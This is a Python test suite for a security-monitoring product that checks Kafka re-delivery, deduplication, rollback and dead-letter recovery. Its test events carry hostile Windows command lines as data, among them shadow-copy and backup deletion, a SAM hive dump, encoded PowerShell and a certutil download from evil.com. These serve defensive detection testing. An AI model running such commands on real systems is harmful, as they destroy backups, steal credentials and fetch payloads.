#!/usr/bin/env python3
"""
MONITORIX ENTERPRISE — PHASE 5.4.3D TEST SUITE (5/6)
Kafka Fault Injection, Recovery & At-Least-Once Delivery Suite
=============================================================
Validates:
  #01: At-Least-Once Re-delivery / Duplicate Ingestion Deduplication
  #02: Consumer Offset Resumption Simulation (Crash Before Commit)
  #03: Database Transaction Failure & Rollback (Offset Preservation)
  #04: Poison Pill / Malformed Payload Resilience (Non-Crashing Ingestion)
  #05: Durable Disk-Backed DLQ Spooling & Drain Recovery (/storage/dlq)
  #06: Crash-Recovery Deduplication Continuity (HitCount Monotonicity)
  #07: Partition Rebalance Overlap Resilience (No Duplicate Alerts)
  #08: High-Burst Replay Deduplication (25 Identical Events -> 1 Alert)
  #09: Out-of-Order Event Timestamps (Timestamp Monotonicity)
  #10: Recovery Resumption Latency Benchmark (< 500ms for 20 Events)
"""

import os
import sys
import time
import json
import shutil
import asyncio
from datetime import datetime, timedelta
from typing import Dict, Any, List

# Ensure backend path is in sys.path
for candidate in ["/app", "/opt/projects/monitorix/watch-sec-python/backend"]:
    if os.path.exists(candidate) and candidate not in sys.path:
        sys.path.insert(0, candidate)

from sqlalchemy.future import select
from sqlalchemy import text, delete, desc

from app.db.session import AsyncSessionLocal
from app.db.models import Agent, DetectionRule, DetectionAlert
from app.services.detection.sigma_compiler import (
    sigma_compiler,
    sigma_registry,
    DetectionResult
)
from app.services.detection.system_rules import SYSTEM_RULES_DEFINITIONS
from app.services.detection.streaming_detector import streaming_detection_engine
from app.services.detection.alert_persistence import alert_persistence_service
from app.workers.dlq_manager import DLQManager

PASSED = 0
FAILED = 0
TEST_RESULTS = []


def record_result(test_num: int, name: str, passed: bool, duration_ms: float, detail: str = ""):
    global PASSED, FAILED
    status = "PASS" if passed else "FAIL"
    if passed:
        PASSED += 1
    else:
        FAILED += 1
    TEST_RESULTS.append({
        "test_num": test_num,
        "name": name,
        "status": status,
        "duration_ms": duration_ms,
        "detail": detail
    })
    print(f"  [{status}] #{test_num:02d}: {name} ({duration_ms:.2f}ms) {detail}")


async def run_suite():
    global PASSED, FAILED
    print("=" * 80)
    print("MONITORIX ENTERPRISE — PHASE 5.4.3D TEST SUITE (PART 5)")
    print("Kafka Fault Injection, Recovery & At-Least-Once Delivery Validation")
    print("=" * 80)

    t_now = int(time.time())
    test_agent_id = f"TEST-KAFKA-REC-{t_now}"
    test_tenant_id = 1
    dlq_test_dir = f"/tmp/monitorix_dlq_test_{t_now}"

    # Pre-register system rules
    for r_def in SYSTEM_RULES_DEFINITIONS:
        compiled = sigma_compiler.compile(
            yaml_content=r_def["yaml_content"],
            rule_id=r_def["id"],
            metadata={
                "tenant_id": None,
                "is_active": True,
                "name": r_def["name"],
                "severity": r_def["severity"]
            }
        )
        sigma_registry.register(compiled)

    try:
        # Pre-seed test agent
        async with AsyncSessionLocal() as db:
            ag = Agent(
                AgentId=test_agent_id,
                TenantId=test_tenant_id,
                Hostname="SRV-RECOVERY-NODE",
                Status="Active"
            )
            db.add(ag)
            await db.commit()

        # ----------------------------------------------------------------------
        # TEST 01: At-Least-Once Re-delivery / Duplicate Ingestion Deduplication
        # ----------------------------------------------------------------------
        t0 = time.perf_counter()
        ev_dup = {
            "EventType": "ProcessExecution",
            "AgentId": test_agent_id,
            "TenantId": test_tenant_id,
            "CommandLine": "net.exe stop MpsSvc /y",
            "Image": "C:\\Windows\\System32\\net.exe",
            "firewall_enabled": False,
            "Timestamp": datetime.utcnow().isoformat()
        }

        async with AsyncSessionLocal() as db:
            # First delivery
            res1 = await streaming_detection_engine.process_kafka_event(db, ev_dup, test_agent_id)
            await db.commit()
            
            # Re-delivery of identical message (simulating Kafka replay)
            res2 = await streaming_detection_engine.process_kafka_event(db, ev_dup, test_agent_id)
            await db.commit()

            al1, is_new1 = res1[0] if res1 else (None, False)
            al2, is_new2 = res2[0] if res2 else (None, True)

            test1_pass = (
                is_new1 is True and
                is_new2 is False and
                al1.Id == al2.Id and
                al2.HitCount == 2
            )
            t1 = time.perf_counter()
            record_result(1, "At-Least-Once Re-delivery Deduplication", test1_pass, (t1 - t0) * 1000,
                          f"First Delivery is_new={is_new1}, Replay is_new={is_new2}, HitCount={al2.HitCount if al2 else 0}")

        # ----------------------------------------------------------------------
        # TEST 02: Consumer Offset Resumption Simulation
        # ----------------------------------------------------------------------
        t0 = time.perf_counter()
        # Simulate consumer processing 3 events, committing DB on each, crashing before committing offset 103 to Kafka
        offset_events = [
            {"offset": 101, "event": {"EventType": "ProcessExecution", "AgentId": test_agent_id, "CommandLine": "vssadmin delete shadows /all /quiet", "crash_dumps_count": 6, "Timestamp": datetime.utcnow().isoformat()}},
            {"offset": 102, "event": {"EventType": "ProcessExecution", "AgentId": test_agent_id, "CommandLine": "bcedit /set {default} bootstatuspolicy ignoreallfailures", "crash_dumps_count": 6, "Timestamp": datetime.utcnow().isoformat()}},
            {"offset": 103, "event": {"EventType": "ProcessExecution", "AgentId": test_agent_id, "CommandLine": "wbadmin delete catalog -quiet", "crash_dumps_count": 6, "Timestamp": datetime.utcnow().isoformat()}}
        ]

        async with AsyncSessionLocal() as db:
            for item in offset_events:
                await streaming_detection_engine.process_kafka_event(db, item["event"], test_agent_id)
            await db.commit()

        # Simulated crash & restart: Kafka re-delivers from uncommitted offset 102 and 103
        async with AsyncSessionLocal() as db:
            replay_res_102 = await streaming_detection_engine.process_kafka_event(db, offset_events[1]["event"], test_agent_id)
            replay_res_103 = await streaming_detection_engine.process_kafka_event(db, offset_events[2]["event"], test_agent_id)
            await db.commit()

            is_new_102 = replay_res_102[0][1] if replay_res_102 else True
            is_new_103 = replay_res_103[0][1] if replay_res_103 else True

            test2_pass = (is_new_102 is False and is_new_103 is False)
            t1 = time.perf_counter()
            record_result(2, "Consumer Offset Resumption Deduplication", test2_pass, (t1 - t0) * 1000,
                          f"Replay Offset 102 is_new={is_new_102}, Offset 103 is_new={is_new_103}")

        # ----------------------------------------------------------------------
        # TEST 03: Database Transaction Failure & Rollback
        # ----------------------------------------------------------------------
        t0 = time.perf_counter()
        async with AsyncSessionLocal() as db:
            # Count alerts before
            c_before = (await db.execute(select(DetectionAlert).where(DetectionAlert.AgentId == test_agent_id))).scalars().all()
            count_before = len(c_before)

            # Simulate transaction rollback
            try:
                # Add an uncommitted alert
                ghost_alert = DetectionAlert(
                    AgentId=test_agent_id,
                    RuleId=9001,
                    MatchedContent="uncommitted_failure_test",
                    Status="New"
                )
                db.add(ghost_alert)
                # Force rollback to simulate DB write failure before Kafka commit
                await db.rollback()
            except Exception:
                await db.rollback()

            # Verify no partial write persisted
            c_after = (await db.execute(select(DetectionAlert).where(DetectionAlert.AgentId == test_agent_id))).scalars().all()
            count_after = len(c_after)

            test3_pass = (count_before == count_after)
            t1 = time.perf_counter()
            record_result(3, "DB Transaction Failure Rollback Invariant", test3_pass, (t1 - t0) * 1000,
                          f"Alerts before={count_before}, Alerts after rollback={count_after}")

        # ----------------------------------------------------------------------
        # TEST 04: Poison Pill / Malformed Payload Resilience
        # ----------------------------------------------------------------------
        t0 = time.perf_counter()
        poison_pills = [
            None,
            "corrupted_raw_string_not_dict",
            1234567,
            [],
            {},
            {"EventType": None},
            {"EventType": "ProcessExecution", "AgentId": None},
            {"EventType": "ProcessExecution", "AgentId": "Unknown"},
            {"EventType": "ProcessExecution", "AgentId": test_agent_id, "Payload": "NOT_VALID_JSON{}"}
        ]

        poison_errors = 0
        async with AsyncSessionLocal() as db:
            for pill in poison_pills:
                try:
                    res = await streaming_detection_engine.process_kafka_event(db, pill, test_agent_id)
                    # Must safely return [] without exception
                    if res is None:
                        poison_errors += 1
                except Exception as ex:
                    print(f"    Poison pill crashed: {ex}")
                    poison_errors += 1

        t1 = time.perf_counter()
        test4_pass = (poison_errors == 0)
        record_result(4, "Poison Pill / Malformed Payload Resilience", test4_pass, (t1 - t0) * 1000,
                          f"Tested {len(poison_pills)} poison pills, Unhandled Crashes={poison_errors}")

        # ----------------------------------------------------------------------
        # TEST 05: Durable Disk-Backed DLQ Spooling & Drain Recovery
        # ----------------------------------------------------------------------
        t0 = time.perf_counter()
        dlq = DLQManager(spool_dir=dlq_test_dir)
        
        # Batch of simulated failed ClickHouse telemetry records
        # Record structure: (event_id, agent_id, tenant_id, event_type, timestamp, payload)
        failed_batch = [
            ("ev-001", test_agent_id, test_tenant_id, "ProcessExecution", datetime.utcnow(), {"cmd": "test1"}),
            ("ev-002", test_agent_id, test_tenant_id, "ProcessExecution", datetime.utcnow(), {"cmd": "test2"})
        ]

        spool_file = await dlq.spool_failed_batch(failed_batch, reason="Simulated ClickHouse partition offline")
        spool_exists = os.path.exists(spool_file)

        # Inspect spooled content
        with open(spool_file, "r") as f:
            spooled_data = json.load(f)
        record_count = spooled_data.get("record_count", 0)

        # Simulate replay drain
        class MockDrainClient:
            def __init__(self):
                self.inserted = []
            def insert_telemetry(self, batch):
                self.inserted.extend(batch)
                return True

        mock_ch = MockDrainClient()
        recovered = await dlq.process_dlq_retries(mock_ch)
        spool_deleted_after_drain = not os.path.exists(spool_file)

        test5_pass = (
            spool_exists and
            record_count == 2 and
            recovered == 2 and
            spool_deleted_after_drain
        )
        t1 = time.perf_counter()
        record_result(5, "Durable Disk-Backed DLQ Spool & Drain", test5_pass, (t1 - t0) * 1000,
                      f"Spooled={record_count}, Recovered={recovered}, CleanedUp={spool_deleted_after_drain}")

        # ----------------------------------------------------------------------
        # TEST 06: Crash-Recovery Deduplication Continuity
        # ----------------------------------------------------------------------
        t0 = time.perf_counter()
        ev_cycle = {
            "EventType": "ProcessExecution",
            "AgentId": test_agent_id,
            "TenantId": test_tenant_id,
            "CommandLine": "nltest /dclist:ENTERPRISE",
            "crash_dumps_count": 8,
            "Timestamp": datetime.utcnow().isoformat()
        }

        # Simulate 3 sequential consumer restart cycles
        hits = []
        for cycle in range(1, 4):
            async with AsyncSessionLocal() as db:
                c_res = await streaming_detection_engine.process_kafka_event(db, ev_cycle, test_agent_id)
                await db.commit()
                if c_res:
                    hits.append(c_res[0][0].HitCount)

        test6_pass = (hits == [1, 2, 3])
        t1 = time.perf_counter()
        record_result(6, "Crash-Recovery Deduplication Continuity", test6_pass, (t1 - t0) * 1000,
                      f"Sequential Cycles HitCounts: {hits} (Expected [1, 2, 3])")

        # ----------------------------------------------------------------------
        # TEST 07: Partition Rebalance Overlap Resilience
        # ----------------------------------------------------------------------
        t0 = time.perf_counter()
        ev_reb = {
            "EventType": "ProcessExecution",
            "AgentId": test_agent_id,
            "TenantId": test_tenant_id,
            "CommandLine": "reg save HKLM\\SAM sam.save",
            "crash_dumps_count": 9,
            "Timestamp": datetime.utcnow().isoformat()
        }

        # Simulate Worker A and Worker B both processing the rebalance message
        async with AsyncSessionLocal() as db_a:
            res_a = await streaming_detection_engine.process_kafka_event(db_a, ev_reb, test_agent_id)
            await db_a.commit()

        async with AsyncSessionLocal() as db_b:
            res_b = await streaming_detection_engine.process_kafka_event(db_b, ev_reb, test_agent_id)
            await db_b.commit()

        al_a_id = res_a[0][0].Id if res_a else None
        al_b_id = res_b[0][0].Id if res_b else None
        al_b_hits = res_b[0][0].HitCount if res_b else 0

        test7_pass = (al_a_id is not None and al_a_id == al_b_id and al_b_hits == 2)
        t1 = time.perf_counter()
        record_result(7, "Partition Rebalance Overlap Resilience", test7_pass, (t1 - t0) * 1000,
                      f"Worker A AlertId={al_a_id}, Worker B AlertId={al_b_id}, Final Hits={al_b_hits}")

        # ----------------------------------------------------------------------
        # TEST 08: High-Burst Replay Deduplication
        # ----------------------------------------------------------------------
        t0 = time.perf_counter()
        ev_burst = {
            "EventType": "ProcessExecution",
            "AgentId": test_agent_id,
            "TenantId": test_tenant_id,
            "CommandLine": "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
            "crash_dumps_count": 10,
            "Timestamp": datetime.utcnow().isoformat()
        }

        burst_count = 25
        final_alert_id = None
        final_hit_count = 0

        async with AsyncSessionLocal() as db:
            for i in range(burst_count):
                b_res = await streaming_detection_engine.process_kafka_event(db, ev_burst, test_agent_id)
                if i == burst_count - 1 and b_res:
                    final_alert_id = b_res[0][0].Id
                    final_hit_count = b_res[0][0].HitCount
            await db.commit()

        # Query all alerts matching this command
        async with AsyncSessionLocal() as db:
            all_burst_alerts = (await db.execute(
                select(DetectionAlert).where(
                    DetectionAlert.AgentId == test_agent_id,
                    DetectionAlert.MatchedContent.like("%powershell -enc%")
                )
            )).scalars().all()

        test8_pass = (len(all_burst_alerts) == 1 and final_hit_count == burst_count)
        t1 = time.perf_counter()
        record_result(8, "High-Burst Replay Deduplication (25 Replays)", test8_pass, (t1 - t0) * 1000,
                      f"Persisted Rows={len(all_burst_alerts)} (Expected 1), HitCount={final_hit_count} (Expected {burst_count})")

        # ----------------------------------------------------------------------
        # TEST 09: Out-of-Order Event Timestamps
        # ----------------------------------------------------------------------
        t0 = time.perf_counter()
        base_time = datetime.utcnow()
        t_early = base_time - timedelta(minutes=2)
        t_late = base_time
        t_middle = base_time - timedelta(minutes=1)

        ev_early = {
            "EventType": "ProcessExecution",
            "AgentId": test_agent_id,
            "TenantId": test_tenant_id,
            "CommandLine": "certutil -urlcache -split -f http://evil.com/payload.exe",
            "crash_dumps_count": 11,
            "Timestamp": t_early.isoformat()
        }
        ev_late = dict(ev_early, Timestamp=t_late.isoformat())
        ev_middle = dict(ev_early, Timestamp=t_middle.isoformat())

        async with AsyncSessionLocal() as db:
            # Send early first
            r_e = await streaming_detection_engine.process_kafka_event(db, ev_early, test_agent_id)
            # Send late second
            r_l = await streaming_detection_engine.process_kafka_event(db, ev_late, test_agent_id)
            # Send middle out-of-order third
            r_m = await streaming_detection_engine.process_kafka_event(db, ev_middle, test_agent_id)
            await db.commit()

            al_oo = r_m[0][0] if r_m else None
            # Re-read from DB
            al_db = (await db.execute(select(DetectionAlert).where(DetectionAlert.Id == al_oo.Id))).scalars().first()

            # Timestamp should be preserved from first seen; LastSeenAt should be >= Timestamp
            test9_pass = (
                al_db is not None and
                al_db.HitCount == 3 and
                al_db.LastSeenAt >= al_db.Timestamp
            )
            t1 = time.perf_counter()
            record_result(9, "Out-of-Order Event Timestamp Handling", test9_pass, (t1 - t0) * 1000,
                          f"FirstSeen={al_db.Timestamp.isoformat() if al_db else ''}, LastSeen={al_db.LastSeenAt.isoformat() if al_db else ''}")

        # ----------------------------------------------------------------------
        # TEST 10: Recovery Resumption Latency Benchmark
        # ----------------------------------------------------------------------
        t0 = time.perf_counter()
        bench_event = {
            "EventType": "ProcessExecution",
            "AgentId": test_agent_id,
            "TenantId": test_tenant_id,
            "CommandLine": "rundll32.exe user32.dll,LockWorkStation",
            "crash_dumps_count": 12,
            "Timestamp": datetime.utcnow().isoformat()
        }

        async with AsyncSessionLocal() as db:
            for _ in range(20):
                await streaming_detection_engine.process_kafka_event(db, bench_event, test_agent_id)
            await db.commit()

        t1 = time.perf_counter()
        duration_ms = (t1 - t0) * 1000
        test10_pass = (duration_ms < 500.0)  # SLA: 20 replay events in < 500ms
        record_result(10, "Recovery Resumption Latency Benchmark", test10_pass, duration_ms,
                      f"20 replay events processed in {duration_ms:.2f}ms (Avg {duration_ms/20:.2f}ms/event, SLA < 500ms)")

    finally:
        # Cleanup isolated test artifacts
        if os.path.exists(dlq_test_dir):
            shutil.rmtree(dlq_test_dir, ignore_errors=True)

        async with AsyncSessionLocal() as db:
            await db.execute(delete(DetectionAlert).where(DetectionAlert.AgentId == test_agent_id))
            await db.execute(delete(Agent).where(Agent.AgentId == test_agent_id))
            await db.commit()

    print("=" * 80)
    print(f"SUITE 5 TOTAL: {PASSED} PASSED, {FAILED} FAILED")
    print("=" * 80)
    if FAILED > 0:
        sys.exit(1)


if __name__ == "__main__":
    asyncio.run(run_suite())
